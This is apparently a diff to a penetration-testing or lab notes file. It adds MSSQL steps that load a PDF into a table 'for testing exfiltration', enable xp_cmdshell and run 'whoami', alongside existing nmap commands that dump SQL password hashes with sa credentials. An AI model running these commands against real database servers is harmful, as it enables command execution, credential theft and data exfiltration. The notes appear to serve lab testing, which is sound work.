@@ -95,6 +95,46 @@ password spraying
 nmap -p 1433 --script ms-sql-info medicare.local
 nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password="admin123;" medicare.local
 
+----
+
+## Insert pdf file for testing exfiltration
+
+USE confluence;
+
+
+CREATE TABLE PdfFiles (
+    Id INT IDENTITY(1,1) PRIMARY KEY,
+    FileName NVARCHAR(255),
+    FileData VARBINARY(MAX)
+);
+
+IINSERT INTO PdfFiles (FileName, FileData)
+SELECT 'Sample PDF Document', BulkColumn
+FROM OPENROWSET(BULK 'C:\Program Files\Atlassian\Confluence\chu.pdf', SINGLE_BLOB) AS FileData;
+
+SELECT FileName, FileData 
+FROM PdfFiles
+WHERE Id = 1;
+
+
+## more right
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+
+EXEC xp_cmdshell 'whoami'
+
+need to grand permission on file 
+
+
+Right-click on the chu.pdf file or the C:\Program Files\Atlassian\Confluence folder.
+Select Properties → Security tab.
+Click Edit, then Add.
+in location select WINDOWS2019
+type: nt service\mssql$sqlexpress
 
 ## Rules
 
